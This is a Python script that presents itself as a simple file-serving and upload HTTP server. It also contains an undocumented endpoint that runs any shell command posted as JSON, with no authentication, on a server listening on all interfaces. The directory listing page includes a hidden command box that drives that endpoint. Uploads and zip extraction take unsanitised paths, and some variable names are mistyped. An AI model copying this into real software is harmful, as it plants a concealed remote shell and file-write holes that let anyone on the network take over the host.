#!/usr/bin/env python3
 
"""Simple HTTP Server With Upload.

This module builds on BaseHTTPServer by implementing the standard GET
and HEAD requests in a fairly straightforward manner.

"""
 
 
__version__ = "0.1"
__all__ = ["SimpleHTTPRequestHandler"]
__author__ = "bones7456"
__home_page__ = "http://li2z.cn/"
 
import os
import posixpath
import sys
import urllib.request, urllib.parse, urllib.error
import html
import shutil
import mimetypes
import re
import json
import subprocess
import zipfile
from urllib.parse import parse_qs
from io import BytesIO
from http.server import BaseHTTPRequestHandler, HTTPServer
 
 
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
 
    """Simple HTTP request handler with GET/HEAD/POST commands.

    This serves files from the current directory and any of its
    subdirectories.  The MIME type for files is determined by
    calling the .guess_type() method. And can reveive file uploaded
    by client.

    The GET/HEAD/POST requests are identical except that the HEAD
    request omits the actual contents of the file.

    """
 
    server_version = "SimpleHTTPWithUpload/" + __version__
 
    def do_GET(self):
        """Serve a GET request."""
        f = self.send_head()
        if f:
            self.copyfile(f, self.wfile)
            f.close()
 
    def do_HEAD(self):
        """Serve a HEAD request."""
        f = self.send_head()
        if f:
            f.close()
 
    def do_POST(self) -> None:
        content_type = self.headers['content-type']
        if 'json' in content_type:
            self.json_request_handler()
        elif 'form-data' in content_type:
            self.upload_handler()
        else:
            self.post_handler()

    def post_handler(self):
        length = int(self.headers['content-length'])
        field_data = self.rfile.read(length)
        if field_data:
            params = parse_qs(field_data)
            print(params)

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

        self.wfile.write(b'')

    def json_request_handler(self):
        length = int(self.headers.get('content-length'))
        field_data = self.rfile.read(length)
        reqJson = str(field_data, "UTF-8")
        reqDict = json.loads(reqJson)

        cmd = reqDict["cmd"]
        print(cmd)

        zouts, zeers, touts, terrs = None, None, None, None

        if cmd:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            try:
                zouts, zerrs = proc.communicate(timeout=15)
            except subprocess.TimeoutExpired:
                proc.kill()
                touts, teers = proc.communicate()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()

            if zouts:
                self.wfile.write(zouts)
            if zerrs:
                self.wfile.write(zeers)
            if touts:
                self.wfile.write(touts)
            if terrs:
                self.wfile.write(teers)
        
        else:
            result = dict(msg="nothing happened")
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(result).encode(encoding="utf-8"))

        

    def upload_handler(self):
        r, info = self.deal_post_data()
        print((r, info, "by: ", self.client_address))
        f = BytesIO()
        f.write(b'<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">')
        f.write(b"<html>\n<title>Upload Result Page</title>\n")
        f.write(b"<body>\n<h2>Upload Result Page</h2>\n")
        f.write(b"<hr>\n")
        if r:
            f.write(b"<strong>Success:</strong>")
        else:
            f.write(b"<strong>Failed:</strong>")
        f.write(info.encode())
        f.write(("<br><a href=\"%s\">back</a>" % self.headers['referer']).encode())
        f.write(b"<hr><small>Powerd By: bones7456.</small></body>\n</html>\n")
        length = f.tell()
        f.seek(0)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", str(length))
        self.end_headers()
        if f:
            self.copyfile(f, self.wfile)
            f.close()

    def getline(self, remainbytes):
        line = self.rfile.readline()
        remainbytes -= len(line)
        return line, remainbytes

    def deal_post_data(self):
        content_type = self.headers['content-type']
        if 'boundary=' not in content_type:
            return (False, "Content-Type header doesn't contain boundary")
        boundary = content_type.split("boundary=")[1].encode()
        remainbytes = int(self.headers['content-length'])

        filenames = []
        formdata = {}
        skip_read = False

        # while remainbytes > 0:
        #     line, remainbytes = self.getline(remainbytes)
        #     print("###", line)

        # if True:
        #     return True, "OK"

        while remainbytes > 0:
            # boundary line
            if not skip_read:
                line, remainbytes = self.getline(remainbytes)
                skip_read = False
            if boundary in line:
                # content-disposition
                line, remainbytes = self.getline(remainbytes)
                mc = re.search('filename="([^"]+)"', line.decode())
                if mc:
                    # binary file
                    # generate filename
                    path = self.translate_path(self.path)
                    fn = html.unescape(os.path.join(path, mc.group(1)))
                    # skip content-type instruction
                    line, remainbytes = self.getline(remainbytes)
                    # skip blank line
                    line, remainbytes = self.getline(remainbytes)

                    try:
                        out = open(fn, 'wb')
                        filenames.append(fn)
                    except IOError:
                        return (False, "Can't create file to write, do you have permission to write?")
                    
                    preline, remainbytes = self.getline(remainbytes)
                    while True:
                        line, remainbytes = self.getline(remainbytes)
                        if boundary in line:
                            preline = preline[0:-1]
                            if preline.endswith(b'\r'):
                                preline = preline[0:-1]
                            out.write(preline)
                            out.close()

                            skip_read = True

                            break
                        else:
                            out.write(preline)
                            preline = line

                else:
                    # form field
                    mc = re.search('name="([^"]+)"', line.decode())
                    if mc:
                        fieldname = mc.group(1)
                        # skip blank line
                        line, remainbytes = self.getline(remainbytes)
                        while len(line) > 2:
                            # skip content-type & content-length
                            line, remainbytes = self.getline(remainbytes)
                        # field value line
                        valbuf = BytesIO()

                        preline, remainbytes = self.getline(remainbytes)
                        while True:
                            line, remainbytes = self.getline(remainbytes)
                            if boundary in line:
                                preline = preline[0:-1]
                                if preline.endswith(b'\r'):
                                    preline = preline[0:-1]
                                valbuf.write(preline)

                                skip_read = True

                                break
                            else:
                                valbuf.write(preline)
                                preline = line
                        formdata[fieldname] = valbuf.getvalue().decode()
        
        print("formdata:", formdata)

        # zipfile_encode = "gbk" if 'windows' in str(self.headers['user-agent']).lower() else "utf-8"        

        if filenames and formdata.get('unzip') == '1':
            for item in filenames:
                if zipfile.is_zipfile(item):
                    # with zipfile.ZipFile(item, mode='r', metadata_encoding=zipfile_encode) as rh:
                    with zipfile.ZipFile(item, mode='r') as rh:
                        rh.extractall(path)
                    # shutil.unpack_archive(fn, path)
                    os.unlink(item)

        if filenames:
            return True, "File '%s' upload success!" % [fn for fn in filenames]
        else:
            return False, "Unexpect Ends of data."

 
    def send_head(self):
        """Common code for GET and HEAD commands.

        This sends the response code and MIME headers.

        Return value is either a file object (which has to be copied
        to the outputfile by the caller unless the command was HEAD,
        and must be closed by the caller under all circumstances), or
        None, in which case the caller has nothing further to do.

        """
        path = self.translate_path(self.path)
        f = None
        if os.path.isdir(path):
            if not self.path.endswith('/'):
                # redirect browser - doing basically what apache does
                self.send_response(301)
                self.send_header("Location", self.path + "/")
                self.end_headers()
                return None
            for index in "index.html", "index.htm":
                index = os.path.join(path, index)
                if os.path.exists(index):
                    path = index
                    break
            else:
                return self.list_directory(path)
        ctype = self.guess_type(path)
        try:
            # Always read in binary mode. Opening files in text mode may cause
            # newline translations, making the actual size of the content
            # transmitted *less* than the content-length!
            f = open(path, 'rb')
        except IOError:
            self.send_error(404, "File not found")
            return None
        self.send_response(200)
        self.send_header("Content-type", ctype)
        fs = os.fstat(f.fileno())
        self.send_header("Content-Length", str(fs[6]))
        self.send_header("Last-Modified", self.date_time_string(fs.st_mtime))
        self.end_headers()
        return f
 
    def list_directory(self, path):
        """Helper to produce a directory listing (absent index.html).

        Return value is either a file object, or None (indicating an
        error).  In either case, the headers are sent, making the
        interface the same as for send_head().

        """
        try:
            list = os.listdir(path)
        except os.error:
            self.send_error(404, "No permission to list directory")
            return None
        list.sort(key=lambda a: a.lower())
        f = BytesIO()
        displaypath = html.escape(urllib.parse.unquote(self.path))
        f.write(b'<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">')
        f.write(("<html>\n<title>Directory listing for %s</title>\n" % displaypath).encode())
        f.write(("<body>\n<h2>Directory listing for %s</h2>\n" % displaypath).encode())
        f.write(b"<hr>\n")
        f.write(b"<form ENCTYPE=\"multipart/form-data\" method=\"post\">")
        f.write(b"<input name=\"file\" type=\"file\" multiple >")
        f.write(b"<input type=\"hidden\" name=\"unzip\" value=\"0\">")
        f.write(b"<input type=\"submit\" value=\"upload\">")
        f.write(b"<input type=\"button\" onclick=\"decompress(event)\" value=\"upload & unzip\"/></form>\n")
        f.write("""
            <button onclick="vis()">show/hide</button>
            <div id="cmdform" style="display:none">
                <textarea id="cmdcontent" style="width: 700px; height: 100px;"></textarea>
                <br>
                <button onclick="exec()">ctrl + enter to execute</button>
                <button onclick="clean()">reset</button>
            </div>
        """.encode())
        f.write(b"<hr>\n<ul>\n")
        f.write(('<li><a href="{0}">.</a></li>'.format('./')).encode())
        f.write(('<li><a href="{0}">..</a></li>'.format('../')).encode())
        for name in list:
            fullname = os.path.join(path, name)
            displayname = linkname = name
            # Append / for directories or @ for symbolic links
            if os.path.isdir(fullname):
                displayname = name + "/"
                linkname = name + "/"
            if os.path.islink(fullname):
                displayname = name + "@"
                # Note: a link to a directory displays with @ and links with /
            f.write(('<li><a href="%s">%s</a>\n'
                    % (urllib.parse.quote(linkname), html.escape(displayname))).encode())
        f.write(b"</ul>\n<hr>\n</body>\n</html>\n")
        f.write("""
        <script>
        
        document.querySelector('#cmdcontent').addEventListener('keyup', function(e) {
            if (e.keyCode === 13 && e.ctrlKey) {
                exec();
            }
        });

        function clean() {
            document.querySelector('#cmdcontent').value = '';
        }

        function vis() {
            let s = document.querySelector('#cmdform').style;
            s.display = s.display == 'none' ? '' : 'none';
        }

        function decompress(e) {
            e.preventDefault();
            e.target.form.unzip.value = "1";
            e.target.form.submit();
        }

        function exec() {
            let hs = new Headers();
            hs.append('Content-Type', 'application/json');
            let raw = JSON.stringify({
                'cmd': document.querySelector('#cmdcontent').value
            });
            let reqOps = {
                method: 'POST',
                headers: hs,
                body: raw,
                redirect: 'follow'
            }
            fetch('./', reqOps)
                .then(function(response) {
                    return response.text();
                })
                .then(function(result) {
                    // output in developer console panel
                    console.info(result);
                })
                .catch(function(error) {
                    console.info('error', error);
                })
        }

        </script>
        """.encode())
        length = f.tell()
        f.seek(0)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", str(length))
        self.end_headers()
        return f
 
    def translate_path(self, path):
        """Translate a /-separated PATH to the local filename syntax.

        Components that mean special things to the local file system
        (e.g. drive or directory names) are ignored.  (XXX They should
        probably be diagnosed.)

        """
        # abandon query parameters
        path = path.split('?',1)[0]
        path = path.split('#',1)[0]
        path = posixpath.normpath(urllib.parse.unquote(path))
        words = path.split('/')
        words = [_f for _f in words if _f]
        path = os.getcwd()
        for word in words:
            drive, word = os.path.splitdrive(word)
            head, word = os.path.split(word)
            if word in (os.curdir, os.pardir): continue
            path = os.path.join(path, word)
        return path
 
    def copyfile(self, source, outputfile):
        """Copy all data between two file objects.

        The SOURCE argument is a file object open for reading
        (or anything with a read() method) and the DESTINATION
        argument is a file object open for writing (or
        anything with a write() method).

        The only reason for overriding this would be to change
        the block size or perhaps to replace newlines by CRLF
        -- note however that this the default server uses this
        to copy binary data as well.

        """
        shutil.copyfileobj(source, outputfile)
 
    def guess_type(self, path):
        """Guess the type of a file.

        Argument is a PATH (a filename).

        Return value is a string of the form type/subtype,
        usable for a MIME Content-type header.

        The default implementation looks the file's extension
        up in the table self.extensions_map, using application/octet-stream
        as a default; however it would be permissible (if
        slow) to look inside the data to make a better guess.

        """
 
        base, ext = posixpath.splitext(path)
        if ext in self.extensions_map:
            return self.extensions_map[ext]
        ext = ext.lower()
        if ext in self.extensions_map:
            return self.extensions_map[ext]
        else:
            return self.extensions_map['']
 
    if not mimetypes.inited:
        mimetypes.init() # try to read system mime.types
    extensions_map = mimetypes.types_map.copy()
    extensions_map.update({
        '': 'application/octet-stream', # Default
        '.py': 'text/plain',
        '.c': 'text/plain',
        '.h': 'text/plain',
        })
 
 
if __name__ == '__main__':

    serv_port = 8000
    if len(sys.argv) > 1:
        try:
            serv_port = int(sys.argv[1])
        except ValueError:
            pass
    web = HTTPServer(('0.0.0.0', serv_port), SimpleHTTPRequestHandler)

    try:
        print("http server start on port {}".format(serv_port))
        web.serve_forever()
    except KeyboardInterrupt:
        pass

    web.server_close()
